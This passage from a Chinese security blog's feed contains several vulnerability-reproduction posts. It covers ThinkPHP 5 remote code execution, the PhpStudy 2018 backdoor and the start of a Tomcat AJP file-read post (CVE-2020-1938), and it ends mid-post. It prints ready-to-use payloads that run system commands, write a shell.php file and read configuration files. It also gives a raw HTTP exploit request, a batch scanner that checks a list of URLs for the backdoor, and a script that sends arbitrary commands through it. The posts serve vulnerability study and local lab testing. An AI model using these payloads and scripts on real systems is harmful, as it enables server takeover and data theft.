src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/3.png" alt><br>构造payload如下：</p><blockquote><p><a href="http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//" target="_blank" rel="noopener">http://127.0.0.1/public/?username=syst1m%0d%0a@eval($_GET[_]);//</a></p></blockquote><p>成功在缓存文件写入payload</p><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/4.png" alt></p><blockquote><p><a href="http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php?_=phpinfo()</a>;</p></blockquote><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/5.png" alt></p><p>成功执行代码</p><h2 id="未开启强制路由导致rce"><a href="#未开启强制路由导致rce" class="headerlink" title="未开启强制路由导致rce"></a>未开启强制路由导致rce</h2><h3 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload-1"><a href="#测试payload-1" class="headerlink" title="测试payload"></a>测试payload</h3><blockquote><p>5.1.x ：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><blockquote><p>5.0.x ：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure><p>当前环境版本是5.0.10，构造payload如下：</p><blockquote><p><a href="http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami" target="_blank" rel="noopener">http://127.0.0.1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p></blockquote><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/6.png" alt><br>成功执行代码</p><h2 id="method任意调用方法导致rce"><a href="#method任意调用方法导致rce" class="headerlink" title="method任意调用方法导致rce"></a>method任意调用方法导致rce</h2><h3 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h3><blockquote><p>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</p></blockquote><h3 id="测试payload-2"><a href="#测试payload-2" class="headerlink" title="测试payload"></a>测试payload</h3><p>构造payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;index HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/7.png" alt><br>成功执行代码</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7792#toc-0" target="_blank" rel="noopener">Thinkphp5 RCE总结</a><br><a href="https://y4er.com/post/thinkphp5-rce" target="_blank" rel="noopener">Thinkphp5 代码执行学习</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ThinkPHP-5-0-10-环境框架搭建&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-0-10-环境框架搭建&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.0.10 环境框架搭建&quot;&gt;&lt;/a&gt;ThinkPHP 5.0.10 环境框架搭建&lt;/h2&gt;&lt;p&gt;ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="ThinkPHP 5" scheme="http://yoursite.com/tags/ThinkPHP-5/"/>
    
      <category term="ThinkPHP" scheme="http://yoursite.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>PhpStudy2018后门漏洞预警及漏洞复现&amp;检测和执行POC脚本</title>
    <link href="http://yoursite.com/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&amp;%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/</id>
    <published>2020-06-03T09:44:51.000Z</published>
    <updated>2020-06-09T12:50:27.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpstudy介绍"><a href="#phpstudy介绍" class="headerlink" title="phpstudy介绍"></a>phpstudy介绍</h2><p>Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户</p><h2 id="后门事件"><a href="#后门事件" class="headerlink" title="后门事件"></a>后门事件</h2><p>2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。<br>于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>目前已知受影响的phpstudy版本<br>phpstudy 2016版php-5.4<br>phpstudy 2018版php-5.2.17<br>phpstudy 2018版php-5.4.45</p><h2 id="后门检测分析"><a href="#后门检测分析" class="headerlink" title="后门检测分析"></a>后门检测分析</h2><p>通过分析，后门代码存在于\ext\php_xmlrpc.dll模块中<br>phpStudy2016和phpStudy2018自带的php-5.2.17、php-5.4.45<br>phpStudy2016路径<br><code>php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>php\php-5.4.45\ext\php_xmlrpc.dll</code><br>phpStudy2018路径<br><code>PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll</code><br><code>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll</code><br>用notepad打开此文件查找@eval，文件存在<code>@eval(%s(‘%s’))</code>证明漏洞存在，如图：<br><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/1.png" alt></p><h2 id="phpstudy-2018漏洞复现"><a href="#phpstudy-2018漏洞复现" class="headerlink" title="phpstudy 2018漏洞复现"></a>phpstudy 2018漏洞复现</h2><p>启动phpstudy，选择php-5.2.17版本，使用burpsuit抓包（如果是本机127.0.0.1环境，代理去掉本地过滤，否则抓不到包）。</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/2.png" alt></p><p>大佬给出exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: yourip.com</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.25 Safari&#x2F;537.36 Core&#x2F;1.70.3730.400 QQBrowser&#x2F;10.5.3805.400</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset:这里就是你要执行的代码命令（经过base64加密）</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>我们修改数据包查看命令<code>phpinfo();</code>执行情况</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/3.png" alt></p><p>继续修改数据包查看命令<code>echo system(&quot;net user&quot;);</code>执行情况</p><p><img src="/2020/06/03/PhpStudy2018%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&%E6%A3%80%E6%B5%8B%E5%92%8C%E6%89%A7%E8%A1%8CPOC%E8%84%9A%E6%9C%AC/4.png" alt></p><p>漏洞复现成功<br>ps：我复现的时候这里有一个坑，就是直接repeater过来的数据包<code>Accept-Encoding</code>字段的参数是<code>gzip, deflate</code>,<code>deflate</code>前面有一个空格，去掉就可以成功执行命令了</p><h2 id="后门检测脚本"><a href="#后门检测脚本" class="headerlink" title="后门检测脚本"></a>后门检测脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_read</span><span class="params">(file_name=<span class="string">"url.txt"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(file_name, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> [i.replace(<span class="string">"\n"</span>, <span class="string">""</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if "http://" or "https://" not in url:</span></span><br><span class="line"><span class="string">        url = "https://" + url</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'accept-charset'</span>: <span class="string">'ZWNobyBlZVN6eHU5Mm5JREFiOw=='</span>,  <span class="comment"># 输出 eeSzxu92nIDAb</span></span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = rq.get(url, headers=headers, timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> res.text.find(<span class="string">'eeSzxu92nIDAb'</span>):</span><br><span class="line">                print(<span class="string">"[存在漏洞] "</span> + url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"[超时] "</span> + url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"phpStudy 批量检测 (需要 gevent,requests 库)"</span>)</span><br><span class="line">    print(<span class="string">"使用之前，请将URL保存为 url.txt 放置此程序同目录下"</span>)</span><br><span class="line">    input(<span class="string">"任意按键开始执行.."</span>)</span><br><span class="line">    tasks = [gevent.spawn(check, url) <span class="keyword">for</span> url <span class="keyword">in</span> file_read()]</span><br><span class="line">    print(<span class="string">"正在执行...请等候"</span>)</span><br><span class="line">    gevent.joinall(tasks)</span><br><span class="line">    wait = input(<span class="string">"执行完毕 任意键退出..."</span>)</span><br></pre></td></tr></table></figure><h2 id="后门执行脚本"><a href="#后门执行脚本" class="headerlink" title="后门执行脚本"></a>后门执行脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span><span class="params">(url, command=<span class="string">"system('calc.exe');"</span>)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'accept-charset'</span>: <span class="string">'c3lzdGVtKCdjYWxjLmV4ZScpOw=='</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    command = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="string">"200"</span>:</span><br><span class="line">        print(<span class="string">"执行完成"</span>)</span><br><span class="line">    a = input(<span class="string">"任意键退出..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(<span class="string">"输入URL(例如:http://127.0.0.1:228/xx.php)\n"</span>)</span><br><span class="line">command = input(<span class="string">"输入命令 默认为 system('calc.exe'); (不想输入直接回车)\n"</span>)</span><br><span class="line">backdoor(url, command)</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>PhpStudyGhost后门供应链攻击事件及相关IOC<br><a href="https://www.freebuf.com/column/214946.html" target="_blank" rel="noopener">https://www.freebuf.com/column/214946.html</a><br>PHPStudy后门分析+复现&amp;附批量Py脚本<br><a href="https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Y29wifB6XTDcJN-RPDMwxg</a><br>phpstudy后门文件分析以及检测脚本<br><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a><br>Phpstudy官网于2016年被入侵，犯罪分子篡改软件并植入后门<br><a href="https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CqHrDFcubyn_y5NTfYvkQw</a><br>phpstudy后门文件分析以及检测脚本<br><a href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw</a><br>phpStudy隐藏后门预警<br><a href="https://www.cnblogs.com/0daybug/p/11571119.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11571119.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;phpstudy介绍&quot;&gt;&lt;a href=&quot;#phpstudy介绍&quot; class=&quot;headerlink&quot; title=&quot;phpstudy介绍&quot;&gt;&lt;/a&gt;phpstudy介绍&lt;/h2&gt;&lt;p&gt;Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin、ZendOPtimizer不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。由于其免费且方便的特性，在国内有着近百万的PHP语言学习者和开发者用户&lt;/p&gt;
&lt;h2 id=&quot;后门事件&quot;&gt;&lt;a href=&quot;#后门事件&quot; class=&quot;headerlink&quot; title=&quot;后门事件&quot;&gt;&lt;/a&gt;后门事件&lt;/h2&gt;&lt;p&gt;2018年12月4日，西湖区公安分局网警大队接报案，某公司发现公司内有20余台计算机被执行危险命令，疑似远程控制抓取账号密码等计算机数据回传大量敏感信息。通过专业技术溯源进行分析，查明了数据回传的信息种类、原理方法、存储位置，并聘请了第三方鉴定机构对软件中的“后门”进行司法鉴定，鉴定结果是该“后门”文件具有控制计算机的功能，嫌疑人已通过该后门远程控制下载运行脚本实现收集用户个人信息。在2019年9月20日，网上爆出phpstudy存在“后门”。作者随后发布了声明。&lt;br&gt;于是想起自己安装过phpstudy软件，赶紧查一下是否存在后门文件，结果一看真存在后门，学个PHP真是不容易，软件被别人偷偷安装了后门。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="POC" scheme="http://yoursite.com/tags/POC/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
    
      <category term="PhpStudy2018" scheme="http://yoursite.com/tags/PhpStudy2018/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含漏洞的搭建与复现：CVE-2020-1938</title>
    <link href="http://yoursite.com/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/"/>
    <id>http://yoursite.com/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/</id>
    <published>2020-06-03T09:44:51.000Z</published>
    <updated>2020-06-03T11:04:02.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件,如：webapp 配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。</p><p>Apache Tomcat都是Apache开源组织开发的用于处理HTTP服务的免费项目，可以作为独立的Web服务器运行。Tomcat是Apache软件基金会中的一个重要项目，性能稳定且免费，是目前较为流行的Web应用服务器。由于Tomcat应用范围较广，所以本次通告的漏洞影响范围较大，请相关用户及时采取防护措施或者升级补丁修复此漏洞。</p><a id="more"></a><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><h3 id="不受影响版本"><a href="#不受影响版本" class="headerlink" title="不受影响版本"></a>不受影响版本</h3><ul><li>Apache Tomcat = 7.0.100</li><li>Apache Tomcat = 8.5.51</li><li>Apache Tomcat = 9.0.31</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul><li><a href="http://tomcat.apache.org/download-80.cgi" target="_blank" rel="noopener">Apache Tomcat 8.0.39</a></li><li><a href="https://github.com/hypn0s/AJPy" target="_blank" rel="noopener">AJPy-master</a></li><li><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi-master</a></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先成功搭建tomcat环境：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/1.png" alt="1"><br>本次漏洞利用的是AJP协议，该协议工作在8009端口，查看本机已开启：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/2.png" alt="2"><br>使用<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">CNVD-2020-10487-Tomcat-Ajp-lfi-master</a>的poc利用成功读取<code>WEB-INF/web.xml</code>文件：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/3.png" alt="3"><br>该POC读取目录为ROOT，其他目录不行：<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/4.png" alt="4"><br>我们在目录下新建一个test.txt的文档，使用poc成功读取<br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/5.png" alt="5"><br><img src="/2020/06/03/Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2020-1938/6.png" alt="6"><br>上面脚本只支持python2，我们使用<a href="https://github.com/hypn0s/AJPy" target="_blank" 